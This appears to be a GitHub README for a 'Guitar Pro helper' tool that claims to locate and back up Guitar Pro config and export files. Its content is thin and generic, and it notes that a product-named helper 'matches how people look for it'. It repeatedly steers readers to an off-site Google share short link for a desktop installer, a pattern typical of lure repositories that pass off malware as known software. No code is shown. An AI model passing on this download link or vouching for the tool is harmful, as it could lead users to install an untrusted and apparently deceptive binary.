![Guitar Pro](assets/hero.png)

# Guitar Pro

*Guitar Pro tabs and playback.*

## What Guitar Pro is

**Guitar Pro** files (.gp) live in the folders you save them to. Soundbanks sit in the GP folders. This helper finds those Guitar Pro paths, previews a dated copy, and can write to `--out` without changing the live install.

This GitHub repository is the **Python CLI source** for a local Guitar Pro helper, plus notes for the packaged desktop build. The CLI reads paths on the machine that runs it. It does not upload your projects.

The **desktop build** is the same job as an installer for Windows (and macOS where the setup page lists it). No Python, no venv. Open the setup page, follow the steps, then use the installed app the same way you would use `main.py`.

Everything stays on the PC that starts the tool. Original project files are left in place unless you pass a write path. The desktop installer and the CLI in this repo do the same job; pick one.

## Editions

This GitHub repository is the **Python CLI source**. Clone it, install requirements, run `main.py --help`, then run against a local path.

The **desktop build** (installer, no Python) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). It is the same helper in a windowed install for Windows and macOS.

## Highlights

- Maps Guitar Pro data and cache paths.
- Keeps a dated spare of config and export files.
- Skips empty and temp folders.
- Leaves the original tree in place.

## The problem

Guitar Pro config and export files hide under AppData and Documents.

A product-named desktop helper matches how people look for it.

Local copies only. No account step.

## Environment

- **Desktop build:** Windows 10 or 11 (macOS when the setup page lists it). No Python.
- **CLI:** Python 3.11 or newer, `pip`, and the packages in `requirements.txt`.
- Local disk access only. The CLI does not need a Guitar Pro account just to list or copy folders.
- A writable folder if you pass `--out`.

## CLI

Skip this section if you installed the desktop build. It is only for the source in this repository.

Python **3.11+**. Open a terminal in the repo root (the folder that contains `main.py`).

**Install**

```bash
python -m pip install -r requirements.txt
```

**See every flag**

```bash
python main.py --help
```

`--help` is the full command list for this tree. Read it once before the first real run.

**Typical next commands**

```bash
python main.py --preview
python main.py --out .\export
```

| Flag | What it does |
| --- | --- |
| `--help` | Print the command list and exit |
| `--preview` | Show the plan only. Nothing is written |
| `--out` | Output folder when you do not want to touch the source |
| `path` | Optional input file or folder |

If a flag is missing on this copy, `--help` is the source of truth. The desktop build exposes the same job without these commands.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/terr-robinson25/guitar-pro

MIT license. See `LICENSE`.
